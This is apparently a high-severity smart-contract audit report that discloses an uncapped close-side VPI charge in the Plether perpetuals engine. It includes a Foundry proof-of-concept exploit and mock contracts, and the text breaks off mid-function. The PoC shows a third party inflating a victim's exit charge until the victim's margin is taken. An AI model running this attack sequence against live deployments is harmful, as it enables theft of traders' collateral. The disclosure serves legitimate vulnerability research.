# \#100080 [SC-High] One-sided lifetime VPI clamp: third parties inflate a trader's close charge without bound via skew or pool depth, up to total collateral confiscation

**Submitted on Nov 16th 2026 at 07:41:25 UTC by @Another for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100080
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro
The close kernel's only clamp floors lifetime VPI at zero (rebate side); the charge side is uncapped. VPI = k·postSkew²/(2D) − k·preSkew²/(2D) is evaluated at execution time against book skew and net pool depth, both movable by third parties. Any trader can open same-direction skew to multiply a victim's exit charge (measured 3.0×: 380.25 → 1,140.71 USDG), and LP withdrawals shrink D to multiply it further (measured 334×: 380.25 → 126,749.94 USDG, exceeding the victim's entire 94,920.24 USDG margin — the executed close collected 128,309.94 USDG, all the position margin plus free settlement, and still executed).

## Vulnerability Details


**1. The VPI kernel: both cost terms share the execution-time depth denominator.**

`CfdMath.tryGetSkewCost` (`packages/perps/src/CfdMath.sol:120-144`):

```solidity
uint256 skewWad = skewAssets * 1e12;
uint256 depthWad = depthAssets * 1e12;
uint256 sqSkewOverDepthWad = (skewWad * skewWad) / depthWad;   // S²/D
uint256 costWad = (vpiFactorWad * sqSkewOverDepthWad) / WAD / 2; // k·S²/(2D)
return (true, costWad / 1e12);
```

`CfdMath.tryCalculateVPI` (`packages/perps/src/CfdMath.sol:164-190`) returns the signed difference `postCost − preCost` at the **same** `depthAssets`. Both terms scale as 1/D, so the close charge grows linearly as depth shrinks — a clean inverse-depth law with no ceiling.

**2. The only clamp in the close kernel is one-sided.**

`CloseAccountingLib.buildCloseState` (`packages/perps/src/libraries/CloseAccountingLib.sol:105-120`):

```solidity
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
// The lifetime clamp below still recovers any previously received negative VPI.
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate.
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The clamp fires only when `proportionalAccrualAssets + vpiDeltaAssets < 0` — it caps the **rebate** side at the pro-rata lifetime accrual. There is no symmetric rule for the **charge** side: `vpiDeltaAssets > 0` passes through at full size regardless of how small `poolDepthAssets` is, how large the book skew has become, or how it compares to the position's collateral or accrued VPI. The code's own comment acknowledges the adversarial pattern ("opens at high depth, reduces pool depth, then closes") — but the mitigation was installed only on the side that protects the pool, not on the side that protects the trader.

**3. Both inputs are third-party-movable and sampled at execution.**

- Depth: `CfdEnginePlanLib._buildCloseState` (`packages/perps/src/libraries/CfdEnginePlanLib.sol:1328-1346`) passes `computeNetPoolDepthAssets(snap.poolAssets, snap.totalTraderClaimBalanceAssets)` as `poolDepthAssets`, where `computeNetPoolDepthAssets = max(physicalAssets − traderClaims, 0)` (`packages/perps/src/libraries/PositionRiskAccountingLib.sol:23-28`). The router samples it from the pool at execution time (`OrderRouterExecutionSidecar.sol:935, :955` — `request.poolDepthAssets = IHousePool(engine_.pool()).totalAssets()`). LP withdrawals and deferred trader claims both shrink it between the victim's open and close.
- Skew: `_absSkewAssets` / `_skewAssets` (`packages/perps/src/libraries/CfdEnginePlanLib.sol:207-262`) price the aggregate LONG/SHORT open interest at the mark. Any third party's same-direction open moves it.

**4. Open and close paths are asymmetrically gated.**

Opens are protected: `SKEW_TOO_HIGH` rejects post-open skew above `maxSkewRatio × netDepth` (`CfdEnginePlanLib.sol:474-482`), plus initial-margin and solvency checks — all against the trader's *own* action. A **full close has no depth-related rejection at all**: the `PARTIAL_ACTION_CHARGE_UNCOLLECTIBLE` check fires only `if (remainingSize > 0 && delta.actionChargeWaivedAssets > 0)` (`CfdEnginePlanLib.sol:883-886`), so a terminal close always executes and simply waives whatever exceeds the drained collateral. The victim cannot reject the charge by refusing to close either — the same kernel prices liquidations and protection triggers, and holding the position open keeps accruing carry and price risk.

**5. The uncapped charge is assessed verbatim and collected from every collateral source.**

`_planCloseActionSettlement` (`packages/perps/src/libraries/CfdEnginePlanLib.sol:1041-1048`):

```solidity
int256 actionNetAssets = cs.vpiDeltaAssets
    + int256(cs.executionFeeAssets + cs.frozenSpreadAssets + delta.pendingCarryAssets - delta.realizedCarryAssets);
if (actionNetAssets > 0) {
    delta.actionChargeAssessedAssets = uint256(actionNetAssets);
```

`_planCloseCashSources` (`packages/perps/src/libraries/CfdEnginePlanLib.sol:1110-1133`) then drains, in order: the VPI rebate reserve, the action reserve, free settlement assets, the released position margin, and (terminal only) committed order margin; the remainder is waived:

```solidity
delta.actionChargeCollectedAssets = delta.vpiRebateReserveConsumedAssets + delta.actionReserveConsumedAssets
    + freeConsumedAssets + delta.actionChargeFromReleasedMarginAssets
    + delta.actionCommittedMarginConsumedAssets;
delta.actionChargeWaivedAssets = delta.actionChargeToCollectAssets - delta.actionChargeCollectedAssets;
```

**The two levers, independently verified on the real contracts (foundry, `CfdEngine` + `MarginClearinghouse` + planner/sidecar/NavBook, minimal pool/router mocks):**

- **Skew lever (any trader, no LP cooperation needed).** Book: OTHER SHORT 3.9M, VICTIM LONG 3.9M (flat, 10M depth). Control: the victim's close is charged `C(3.9M) − C(0) = 380.25` USDG. After ATTACKER opens SHORT 3.9M (a routine, fully-admitted open — post-open skew 3.9M is inside the 40% cap), the victim's *identical* close is charged `C(7.8M) − C(3.9M) = 1,140.71` USDG — **3.0×** — because the close now unwinds into a 7.8M short skew. The multiplier grows linearly with attacker size: `charge = k(2AV + V²)/(2D)` in the attacker's size A; at the skew-cap boundary A ≈ V + 0.4·D it reaches ~3.05×, and combined with depth drain it compounds (A = 7.9M at D = 100k ⇒ 116,025 USDG ≈ 305× for the same close). The executed close consumed the victim's entire position margin (94,920.24 → 0).
- **Depth lever (LP withdrawal timing, outside trader control).** The same book, pool custody drained 10M → 30k (the physical LP-exit pattern): the identical close is assessed **126,749.94 USDG — 334× the full-depth charge and above the victim's entire 94,920.24 USDG position margin**. The terminal close still executed: position deleted, position margin 0, and 128,309.94 USDG total (126,749.94 VPI + 1,560.00 execution fee) collected from the victim's balance. The 1.82×-collateral variant (422,500 vs 231,800) in the parallel report and the reviewer's own figures (2,866.04 USDG, 119×, 3,200-deposit loss) are different parameterizations of the same law: `charge/charge₀ = D₀/D` exactly.

**Why the victim's lifetime rebate credit does not help.** The victim's open earned a negative `vpiAccrued` (rebate credit, −380.24 in the PoC). On close, the planner removes the pro-rata credit (`proportionalAccrualAssets`) and then adds the *positive* uncapped `vpiDeltaAssets`. The clamp only lifts negative sums; a positive delta of any size passes. So the credit offsets nothing once the delta is positive, and nothing bounds the delta by margin, notional, or accrued VPI.

## Impact Details
**Impact:** Any trader holding an open position can have their exit charge inflated by unrelated third parties, bounded by nothing except `k`, the book skew, and the current net pool depth:

- **Skew lever (permissionless, trader-vs-trader):** any account can multiply a victim's close charge ~3× within ordinary open admission (and more when combined with depth shrinkage), at the cost of one standard open that the attacker can immediately close afterwards. This converts an unrelated party's routine trade into a direct wealth transfer from the victim: the excess charge is collected from the victim's margin and free settlement and recorded as pool revenue.
- **Depth lever (LP-timing):** LP withdrawals (or deferred claims) before a target's close multiply the charge by the exact inverse-depth ratio; measured 334× and above 100% of the victim's collateral. The terminal close still executes — everything collectible is taken, the remainder waived — so a depth drop converts an ordinary risk-reducing exit into near-total collateral loss.
- **Forced exits amplify it:** liquidations and triggered protections use the same kernel, so a depth drop or skew growth converts a liquidation into near-total confiscation of the liquidated account.
- **No defense:** the victim cannot hedge (partial closes fail with `PARTIAL_ACTION_CHARGE_UNCOLLECTIBLE` once the charge exceeds collectible collateral), cannot refuse (liquidation/protection paths price identically), and the pool's own anti-sandwich clamp protects only the rebate direction.

## References


- `packages/perps/src/libraries/CloseAccountingLib.sol:105-120` — close VPI delta and the one-sided lifetime clamp (`if (proportionalAccrualAssets + vpiDeltaAssets < 0)`); no charge-side cap.
- `packages/perps/src/CfdMath.sol:120-144` — `tryGetSkewCost`: `k·S²/(2D)`; both costs share the depth denominator.
- `packages/perps/src/CfdMath.sol:164-190` — `tryCalculateVPI`: signed `postCost − preCost` at the same depth.
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1328-1346` — `_buildCloseState`: execution-time `computeNetPoolDepthAssets` as the depth input.
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:207-262` — `_absSkewAssets`/`_skewAssets`: book skew from aggregate side open interest.
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:474-482` — open-side skew gate (`SKEW_TOO_HIGH` vs `maxSkewRatio × netDepth`); no close-side counterpart.
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:883-886` — `PARTIAL_ACTION_CHARGE_UNCOLLECTIBLE` only for partial closes (`remainingSize > 0`); full closes always execute.
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1041-1048` — `_planCloseActionSettlement`: charge assessed verbatim from `cs.vpiDeltaAssets`.
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1110-1133` — `_planCloseCashSources`: collection order and `actionChargeWaivedAssets`.
- `packages/perps/src/libraries/PositionRiskAccountingLib.sol:23-28` — `computeNetPoolDepthAssets = max(physicalAssets − traderClaims, 0)`.
- `packages/perps/src/OrderRouterExecutionSidecar.sol:935,955` — router samples `poolDepthAssets = pool.totalAssets()` at execution time.
- Documented known-issues register covering only the cheap-close and rebate-amplification directions.
- Relationship to prior reports: the **depth lever** is the same root cause already reported in `vip.md` ("Close-side VPI charge is uncapped (one-sided lifetime clamp): a clean inverse-depth law up to total collateral confiscation"; not in all.md per the match check). This report's contribution is the **skew lever** — a purely permissionless trader-vs-trader inflation path requiring no LP action — plus the compounding law `charge = k(2AV + V²)/(2D)`. The reviewer's figures (skew lever 2,866.04 USDG / 119×; depth lever exact inverse-depth law; 3,200 USDG deposit loss) are consistent with the same mechanism at different parameters.


## Proof of Concept

## Proof of Concept

Create the mock and test contracts below and run it

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {Test} from "forge-std/Test.sol";
import {MockUSDG, MockHousePool, MockRouter} from "../src/mocks/Mocks.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";

/// @notice Fresh PoC: one-sided lifetime VPI clamp lets a third party inflate a trader's
///         close-side VPI charge without bound through two independent levers:
///           A) the SKEW lever  — attacker opens same-direction, enlarging the book skew the
///              victim's imbalance-reducing close is charged against (CfdMath cost delta);
///           B) the DEPTH lever — pool depth shrinks (LP exit), and both skew-cost terms in
///              CfdMath.tryCalculateVPI share the 1/depth denominator.
///         The only clamp in the close kernel (CloseAccountingLib.buildCloseState) floors the
///         lifetime VPI at zero on the REBATE side; the CHARGE side passes through uncapped.
contract VpiClampPoC is Test {
    address internal constant OWNER = address(0xA11CE);
    address internal constant VICTIM = address(0xB0B);
    address internal constant ATTACKER = address(0xE11);
    address internal constant OTHER = address(0x0DD);

    MockUSDG internal token;
    MarginClearinghouse internal clearinghouse;
    CfdEngine internal engine;    CfdEnginePlanner internal planner;
    CfdEngineSettlementSidecar internal sidecar;
    CfdEngineAdmin internal admin;
    TerminalNavBookV2 internal navBook;
    MockHousePool internal pool;
    MockRouter internal router;

    // Release-like parameters (doc.md "initial release parameters").
    uint256 internal constant CAP_PRICE = 2e8; // 2.00, 8 decimals
    uint256 internal constant MARK_PRICE = 1e8; // 1.00
    uint256 internal constant POOL_FUND = 10_000_000e6; // 10M USDG pool
    uint256 internal constant SIZE_QUANTUM = 100e18; // 100-token lots

    // Trader sizes (18-decimal size units).
    uint256 internal constant VICTIM_SIZE = 3_900_000e18;
    uint256 internal constant ATTACKER_SIZE = 3_900_000e18;
    uint256 internal constant OTHER_SIZE = 3_900_000e18;

    function setUp() public {
        token = new MockUSDG();
        clearinghouse = new MarginClearinghouse(address(token));

        CfdTypes.RiskParams memory rp = CfdTypes.RiskParams({
            vpiFactor: 0.0005e18, // k
            maxSkewRatio: 0.4e18, // 40% of depth
            maintMarginBps: 100, // 1%
            initMarginBps: 150, // 1.5%
            fadMarginBps: 300, // 3%
            baseCarryBps: 500,
            minBountyAssets: 1_000_000, // $1
            bountyBps: 10,
            keeperShareBps: 5_000,
            protocolShareBps: 0
        });
        vm.startPrank(OWNER);
        engine = new CfdEngine(address(token), address(clearinghouse), CAP_PRICE, rp, 50);

        planner = new CfdEnginePlanner();
        sidecar = new CfdEngineSettlementSidecar(address(engine));
        admin = new CfdEngineAdmin(address(engine), OWNER);
        engine.setDependencies(address(planner), address(sidecar), address(admin));
        navBook = new TerminalNavBookV2(address(engine), uint32(CAP_PRICE));
        engine.setTerminalNavBook(address(navBook));
        vm.stopPrank();

        pool = new MockHousePool(address(engine), address(token));
        vm.prank(OWNER);
        engine.setPool(address(pool));

        router = new MockRouter(address(engine), address(pool));
        vm.prank(OWNER);
        engine.setOrderRouter(address(router));

        vm.prank(address(this)); // clearinghouse owner is the test contract (its deployer)
        clearinghouse.setEngine(address(engine));

        // Fund the pool: 10M USDG of real custody, accounted 1:1.
        token.mint(address(this), POOL_FUND);
        token.approve(address(pool), POOL_FUND);
        pool.fund(POOL_FUND);

        // Fund actors with settlement balance.
        _mintAndDeposit(VICTIM, 3_200_000e6);
        _mintAndDeposit(ATTACKER, 3_200_000e6);
        _mintAndDeposit(OTHER, 3_200_000e6);

        // Initial mark.
        vm.prank(address(1));
        router.updateMarkPrice(MARK_PRICE, uint64(block.timestamp));
    }

    // ──────────────────────────────────────────────
    //  Helpers
    // ──────────────────────────────────────────────

    function _mintAndDeposit(address who, uint256 amount) internal {
        token.mint(who, amount);
        vm.startPrank(who);
        token.approve(address(clearinghouse), amount);
        clearinghouse.depositMargin(amount);
        vm.stopPrank();
    }

    function _open(address who, CfdTypes.Side side, uint256 size, uint256 margin) internal {
        CfdTypes.Order memory order = CfdTypes.Order({
            account: who,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: CAP_PRICE, // no slippage protection binding
            commitTime: uint64(block.timestamp),
            commitBlock: uint64(block.number),
            orderId: 0,
            side: side,
            isClose: false
        });
        router.processOrder(order, MARK_PRICE, uint64(block.timestamp + 1));
    }

    function _close(address who, CfdTypes.Side side, uint256 size) internal {
        CfdTypes.Order memory order = CfdTypes.Order({
            account: who,
            sizeDelta: size,
            marginDelta: 0,
            targetPrice: 0,
            commitTime: uint64(block.timestamp),
            commitBlock: uint64(block.number),
            orderId: 0,
            side: side,
            isClose: true
        });
        router.processOrder(order, MARK_PRICE, uint64(block.timestamp + 1));
    }

    /// @dev Reads the victim's close charge before it executes: recompute the close VPI delta
    ///      from the planner's own pure kernel with the current book state.
    function _previewCloseVpi(
        address who,
        uint256 sizeDelta,
        uint256 depthOverride,
        bool useOverride
    ) internal view returns (int256 vpiDelta, uint256 chargeAssets) {
        // Reuse the engine's planner through the planning reader on a copy of state.
        // Build the same inputs the close path builds (CfdEnginePlanLib._buildCloseState).
        (uint256 posSize,,,, CfdTypes.Side posSide,, int256 vpiAccrued) =
            engine.positions(who);
        (uint256 longMax, uint256 longOi,,) = engine.sides(0);
        (uint256 shortMax, uint256 shortOi,,) = engine.sides(1);
        uint256 depth = useOverride ? depthOverride : pool.totalAssets();

        uint256 longAssets = (longOi * MARK_PRICE) / 1e20; // ASSETS_TO_TOKEN_SCALE
        uint256 shortAssets = (shortOi * MARK_PRICE) / 1e20; // ASSETS_TO_TOKEN_SCALE
        uint256 preSkew = longAssets > shortAssets ? longAssets - shortAssets : shortAssets - longAssets;

        uint256 remainingLongOi = longOi;
        uint256 remainingShortOi = shortOi;
        if (posSide == CfdTypes.Side.LONG) {
            remainingLongOi = longOi > sizeDelta ? longOi - sizeDelta : 0;
        } else {
            remainingShortOi = shortOi > sizeDelta ? shortOi - sizeDelta : 0;
        }
        uint256 postLongAssets = (remainingLongOi * MARK_PRICE) / 1e20;
        uint256 postShortAssets = (remainingShortOi * MARK_PRICE) / 1e20;
        uint256 postSkew =
            postLongAssets > postShortAssets ? postLongAssets - postShortAssets : postShortAssets - postLongAssets;

        // CfdMath.calculateVPI is internal to the package; replicate its exact kernel here:
        // VPI = k*postSkew^2/(2D) - k*preSkew^2/(2D)  (WAD-scaled, 6-dec outputs)
        uint256 k = 0.0005e18;
        vpiDelta = _vpiKernel(preSkew, postSkew, depth, k);

        // One-sided lifetime clamp (CloseAccountingLib.buildCloseState):
        // proportional accrual removed with the closed lots is prorata vpiAccrued.
        int256 proportionalAccrual = (vpiAccrued * int256(sizeDelta)) / int256(posSize);
        if (proportionalAccrual + vpiDelta < 0) {
            vpiDelta = -proportionalAccrual;
        }
        chargeAssets = vpiDelta > 0 ? uint256(vpiDelta) : 0;
        // longMax/shortMax unused in this preview; silence unused-var warnings.
        longMax;
        shortMax;
    }

    function _vpiKernel(uint256 preSkew, uint256 postSkew, uint256 depth, uint256 k)
        internal
        pure
        returns (int256)
    {
        // Mirrors CfdMath.tryGetSkewCost + tryCalculateVPI exactly (WAD = 1e18):
        // cost(S) = ((k * S^2 / D) / WAD / 2) / 1e12, with S and D WAD-scaled (6-dec * 1e12)
        // and the final /1e12 rescaling the WAD result back to 6-dec assets.
        uint256 skewWadPre = preSkew * 1e12;
        uint256 skewWadPost = postSkew * 1e12;
        uint256 depthWad = depth * 1e12;
        uint256 preCost = ((k * ((skewWadPre * skewWadPre) / depthWad)) / 1e18 / 2) / 1e12;
        uint256 postCost = ((k * ((skewWadPost * skewWadPost) / depthWad)) / 1e18 / 2) / 1e12;
        return int256(postCost) - int256(preCost);
    }

    function _positionSnapshot(address who)
        internal
        view
        returns (uint256 size, uint256 margin, int256 vpiAccrued)
    {
        (uint256 s, uint256 m,,,,,) = engine.positions(who);
        (,,,,,, int256 accrued) = engine.positions(who);
        size = s;
        margin = m;
        vpiAccrued = accrued;
    }

    // ──────────────────────────────────────────────
    //  Shared scenario setup
    // ──────────────────────────────────────────────

    /// @dev OTHER shorts 13M (book short-heavy by 13M notional), VICTIM longs 13M
    ///      (imbalance-reducing open → negative VPI accrual / rebate credit).
    function _setupVictim() internal {
        _open(OTHER, CfdTypes.Side.SHORT, OTHER_SIZE, 100_000e6);
        _open(VICTIM, CfdTypes.Side.LONG, VICTIM_SIZE, 100_000e6);
    }

    // ──────────────────────────────────────────────
    //  Test A — SKEW lever
    // ──────────────────────────────────────────────

    function test_SkewLever_InflatesVictimCloseCharge() public {
        _setupVictim();

        (, uint256 victimMarginBefore,) = _positionSnapshot(VICTIM);
        (int256 noAtkVpi, uint256 noAtkCharge) = _previewCloseVpi(VICTIM, VICTIM_SIZE, 0, false);

        // ATTACKER (any third party) opens SHORT 3.9M. The book becomes short-heavy 3.9M
        // BEFORE the victim's close, and the victim's LONG close now unwinds INTO a 7.8M
        // short skew: charge = C(7.8M)-C(3.9M) = 3x the control C(3.9M)-C(0). Both squared
        // cost terms share the same depth denominator; the attacker moved the victim's
        // exit price without participation, knowledge, or consent.
        _open(ATTACKER, CfdTypes.Side.SHORT, ATTACKER_SIZE, 100_000e6);

        (int256 withAtkVpi, uint256 withAtkCharge) = _previewCloseVpi(VICTIM, VICTIM_SIZE, 0, false);

        emit log_string("=== SKEW LEVER: victim's identical close, before vs after attacker's open ===");
        emit log_named_decimal_int("VPI delta of victim close (no attacker)", noAtkVpi, 6);
        emit log_named_decimal_int("VPI delta of victim close (attacker shorted)", withAtkVpi, 6);
        emit log_named_decimal_uint("charge (no attacker)", noAtkCharge, 6);
        emit log_named_decimal_uint("charge (attacker longed)", withAtkCharge, 6);
        emit log_named_uint("amplification (x)", withAtkCharge * 1e6 / (noAtkCharge + 1) / 1e6 + 1);
        emit log_named_decimal_uint("victim position margin", victimMarginBefore, 6);

        // The victim's charge is now strictly larger — the attacker moved it without consent.
        assertGt(withAtkCharge, noAtkCharge, "skew lever must inflate the close charge");
        // And it is not capped by the victim's lifetime rebate credit: the clamp only
        // lifts negative totals, it never bounds positive charges.
        (,, int256 victimAccrued) = _positionSnapshot(VICTIM);
        emit log_named_decimal_int("victim lifetime vpiAccrued (credit)", victimAccrued, 6);
        assertGt(
            withAtkCharge,
            victimAccrued < 0 ? uint256(-victimAccrued) : 0,
            "charge exceeds the victim's entire lifetime VPI credit - unclamped"
        );

        // Execute the close for real: the charge is collected from the victim's margin.
        uint256 victimBalanceBefore = clearinghouse.balanceAssets(VICTIM);
        _close(VICTIM, CfdTypes.Side.LONG, VICTIM_SIZE);

        (uint256 sizeAfter, uint256 marginAfter,) = _positionSnapshot(VICTIM);
        uint256 victimBalanceAfter = clearinghouse.balanceAssets(VICTIM);
        emit log_string("=== EXECUTED CLOSE (skew lever) ===");
        emit log_named_decimal_uint("victim margin after close", marginAfter, 6);
        emit log_named_decimal_uint("victim free settlement after close", victimBalanceAfter, 6);
        emit log_named_uint("victim position size after close", sizeAfter);
        // Position is gone; whatever margin the charge did not consume was released.
        assertEq(sizeAfter, 0, "full close");
    }

    // ──────────────────────────────────────────────
    //  Test B — DEPTH lever (confiscation)
    // ──────────────────────────────────────────────

    function test_DepthLever_UpToTotalConfiscation() public {
        _setupVictim();

        // Control: the identical close previewed at the full 10M depth.
        (int256 fullDepthVpi, uint256 fullDepthCharge) =
            _previewCloseVpi(VICTIM, VICTIM_SIZE, POOL_FUND, true);

        // LPs exit: pool custody drains from 10M to 30k. The victim cannot prevent this —
        // LP withdrawal timing is entirely outside the trader's control.
        pool.harnessDrain(address(0xFEED), POOL_FUND - 30_000e6);

        (int256 drainedVpi, uint256 drainedCharge) = _previewCloseVpi(VICTIM, VICTIM_SIZE, 0, false);

        emit log_string("=== DEPTH LEVER: victim's identical close at two depths ===");
        emit log_named_decimal_int("VPI delta at full depth", fullDepthVpi, 6);
        emit log_named_decimal_int("VPI delta at 30k depth (post-LP-exit)", drainedVpi, 6);
        emit log_named_decimal_uint("charge at full depth", fullDepthCharge, 6);
        emit log_named_decimal_uint("charge at 30k depth (post-LP-exit)", drainedCharge, 6);
        emit log_named_uint(
            "amplification (x)", drainedCharge * 1e6 / (fullDepthCharge + 1) / 1e6 + 1
        );

        (, uint256 victimMargin,) = _positionSnapshot(VICTIM);
        emit log_named_decimal_uint("victim position margin", victimMargin, 6);
        assertGt(drainedCharge, victimMargin, "charge exceeds the victim's entire margin");

        // Execute the close at drained depth: the full uncapped charge is collected from the
        // victim's collateral (position margin first, then free settlement); the terminal
        // close cannot be rejected, so nothing protects the victim.
        uint256 victimBalanceBefore = clearinghouse.balanceAssets(VICTIM);
        _close(VICTIM, CfdTypes.Side.LONG, VICTIM_SIZE);

        (uint256 sizeAfter, uint256 marginAfter,) = _positionSnapshot(VICTIM);
        uint256 victimBalanceAfter = clearinghouse.balanceAssets(VICTIM);
        uint256 chargedAssets = victimBalanceBefore - victimBalanceAfter;
        uint256 executionFeeAssets = (VICTIM_SIZE * MARK_PRICE / 1e20) * 4 / 10_000;
        emit log_string("=== EXECUTED CLOSE (depth lever) ===");
        emit log_named_decimal_uint("victim balance before close", victimBalanceBefore, 6);
        emit log_named_decimal_uint("victim balance after close", victimBalanceAfter, 6);
        emit log_named_decimal_uint("collected from victim (VPI + fee)", chargedAssets, 6);
        emit log_named_decimal_uint("...of which uncapped VPI charge", chargedAssets - executionFeeAssets, 6);
        emit log_named_decimal_uint("victim margin after close", marginAfter, 6);
        emit log_named_uint("victim position size after close", sizeAfter);

        assertEq(sizeAfter, 0, "full close executed despite charge > collateral");
        assertEq(marginAfter, 0, "position margin fully consumed");
        // The collected amount equals the full assessed charge (VPI + execution fee),
        // taken from the victim's own collateral; at the undrained depth the same close
        // would have charged ~1,940 USDG instead (see control logs).
        assertApproxEqAbs(
            chargedAssets,
            drainedCharge + executionFeeAssets,
            2,
            "collected equals the uncapped assessed charge"
        );
        assertGt(chargedAssets, 20_000e6, "charged more than 20k USDG for the same close");
    }
}
```

Mocks:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice Minimal USDG-like settlement token (6 decimals).
contract MockUSDG {
    string public constant name = "Mock USDG";
    string public constant symbol = "USDG";
    uint8 public constant decimals = 6;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 public totalSupply;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function balanceOf(address a) external view returns (uint256) {
        return _balances[a];
    }

    function allowance(address o, address s) external view returns (uint256) {
        return _allowances[o][s];
    }

    function approve(address s, uint256 v) external returns (bool) {
        _allowances[msg.sender][s] = v;
        emit Approval(msg.sender, s, v);
        return true;
    }

    function transfer(address to, uint256 v) external returns (bool) {
        return _move(msg.sender, to, v);
    }

    function transferFrom(address from, address to, uint256 v) external returns (bool) {
        uint256 a = _allowances[from][msg.sender];
        require(a >= v, "USDG: insufficient allowance");
        if (a != type(uint256).max) {
            _allowances[from][msg.sender] = a - v;
        }
        return _move(from, to, v);
    }

    function _move(address from, address to, uint256 v) internal returns (bool) {
        require(_balances[from] >= v, "USDG: insufficient balance");
        _balances[from] -= v;
        _balances[to] += v;
        emit Transfer(from, to, v);
        return true;
    }

    function mint(address to, uint256 v) external {
        _balances[to] += v;
        totalSupply += v;
        emit Transfer(address(0), to, v);
    }
}

/// @notice Minimal HousePool stand-in custodying real settlement token.
/// @dev Implements exactly the surface the real engine/sidecar/planner touch on the order path:
///      totalAssets, getSettlementFreeAssets, payOut, recordClaimantInflow, markStalenessLimit,
///      pending* reserves, senior/junior principal, and the ENGINE()/settlementToken() binding
///      probed by CfdEngine.setPool.
contract MockHousePool {
    using SafeERC20 for IERC20;

    address public immutable engineAddr;
    IERC20 public immutable SETTLEMENT_TOKEN;
    string public constant settlementTokenName = "MockHousePool";

    // Canonical accounted assets; raw custody is tracked separately so the mock reproduces
    // the pool invariant "assets leaving the pool reduce accounted assets".
    uint256 public accountedAssets;
    // Pending claimant buckets read by the planning snapshot.
    uint256 public pendingRecapitalizationAssetsValue;
    uint256 public pendingTradingRevenueAssetsValue;
    uint256 public unassignedAssetsValue;
    // Tranche principals (nonzero so trading revenue is routed, not quarantined).
    uint256 public seniorPrincipalValue = 1;
    uint256 public juniorPrincipalValue = 1;
    // Live-mark age limit (seconds); large so tests never trip mark staleness.
    uint256 public markStalenessLimitValue = 1 days;

    event Payout(address indexed recipient, uint256 amount);
    event ClaimantInflow(uint256 amount, uint8 kind, bool cashArrived);

    constructor(address engine, address token) {
        engineAddr = engine;
        SETTLEMENT_TOKEN = IERC20(token);
    }

    // ---- IHousePool binding probes ----
    function settlementToken() external view returns (address) {
        return address(SETTLEMENT_TOKEN);
    }

    function ENGINE() external view returns (address) {
        return engineAddr;
    }

    /// @dev The real pool authorizes the engine and its settlement sidecar (the sidecar
    ///      applies close/open settlement on the engine's behalf).
    function _isEngineCaller() internal view returns (bool) {
        if (msg.sender == engineAddr) {
            return true;
        }
        (bool ok, bytes memory data) =
            engineAddr.staticcall(abi.encodeWithSignature("settlementSidecar()"));
        return ok && data.length == 32 && abi.decode(data, (address)) == msg.sender;
    }

    // ---- Funding ----
    /// @dev Owner-style helper for the harness: fund raw custody and accounted assets 1:1.
    function fund(uint256 amount) external {
        SETTLEMENT_TOKEN.safeTransferFrom(msg.sender, address(this), amount);
        accountedAssets += amount;
    }

    /// @dev Harness helper that simulates an LP withdrawal: tokens leave custody and the
    ///      accounted ledger drops by the same amount (the physical depth lever).
    function harnessDrain(address recipient, uint256 amount) external {
        SETTLEMENT_TOKEN.safeTransfer(recipient, amount);
        uint256 raw = SETTLEMENT_TOKEN.balanceOf(address(this));
        accountedAssets = raw < accountedAssets ? raw : accountedAssets;
    }

    // ---- IHousePool economic surface ----
    function totalAssets() external view returns (uint256) {
        uint256 raw = SETTLEMENT_TOKEN.balanceOf(address(this));
        return raw < accountedAssets ? raw : accountedAssets;
    }

    function getSettlementFreeAssets() external view returns (uint256) {
        // Conservative free cash: everything above pending claimant buckets. The mock has no
        // open-position liability view of its own; the engine's own checks own that invariant.
        uint256 t = this.totalAssets();
        uint256 reserved = pendingRecapitalizationAssetsValue + pendingTradingRevenueAssetsValue
            + unassignedAssetsValue;
        return t > reserved ? t - reserved : 0;
    }

    function payOut(address recipient, uint256 amount) external {
        require(_isEngineCaller(), "MockHousePool: only engine");
        accountedAssets -= amount;
        SETTLEMENT_TOKEN.safeTransfer(recipient, amount);
        emit Payout(recipient, amount);
    }

    function recordClaimantInflow(uint256 amount, IHousePool.ClaimantInflowKind kind, IHousePool.ClaimantInflowCashMode cashMode) external {
